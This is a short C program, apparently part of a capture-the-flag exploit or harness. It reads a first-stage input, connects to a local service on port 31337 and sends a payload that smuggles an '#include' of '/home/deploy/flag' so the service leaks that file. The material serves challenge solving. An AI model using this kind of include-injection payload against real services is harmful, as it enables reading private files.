#include <netinet/in.h>
#include <stdio.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <unistd.h>

static const char PAYLOAD[] = "0\n#include \"/home/deploy/flag\"@";

static void readn(int fd, char *buf, size_t n) {
  while (n) {
    ssize_t n_read = read(fd, buf, n);
    buf += n_read;
    n -= n_read;
  }
}

int main(void) {
  puts("stack address @ 0x0");
  fflush(stdout);
  char stage1[0xc0];
  readn(STDIN_FILENO, stage1, sizeof(stage1));
  sleep(1);
  int s = socket(AF_INET, SOCK_STREAM, 0);
  struct sockaddr_in sin;
  sin.sin_family = AF_INET;
  sin.sin_addr.s_addr = htonl(0x7f000001);
  sin.sin_port = htons(31337);
  connect(s, (const struct sockaddr *)&sin, sizeof(sin));
  write(s, PAYLOAD, sizeof(PAYLOAD));
  char stage2[1];
  readn(STDIN_FILENO, stage2, sizeof(stage2));
}